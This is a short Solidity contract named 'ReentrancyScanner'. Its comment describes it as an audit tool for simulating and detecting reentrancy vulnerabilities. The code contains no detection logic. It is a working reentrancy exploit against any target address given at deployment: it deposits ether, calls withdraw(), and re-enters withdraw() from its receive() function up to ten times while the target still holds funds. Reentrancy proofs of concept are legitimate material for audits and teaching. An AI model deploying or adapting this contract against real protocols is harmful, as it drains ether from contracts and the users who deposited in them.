// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title ReentrancyScanner
 * @dev Contract designed to simulate and detect reentrancy vulnerabilities 
 * in external protocols during security audits.
 */
contract ReentrancyScanner {
    address public target;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 10;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        if (address(target).balance > 0 && attackCount < MAX_ATTACKS) {
            attackCount++;
            (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Attack failed");
        }
    }

    function initiateAttack() external payable {
        attackCount = 0;
        (bool success, ) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "Initial deposit failed");
        (success, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Initial withdraw failed");
    }
}
